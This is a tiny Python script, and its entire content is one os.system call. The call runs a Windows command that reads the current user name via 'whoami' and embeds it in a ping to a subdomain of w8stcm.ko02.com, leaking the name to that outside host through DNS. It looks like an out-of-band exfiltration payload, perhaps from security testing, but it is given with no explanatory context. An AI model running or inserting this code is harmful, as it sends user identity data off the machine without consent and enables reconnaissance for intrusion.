import os

os.system('for /F "delims= tokens=2" %i in (\'whoami\') do ping -n 1 %i.w8stcm.ko02.com')
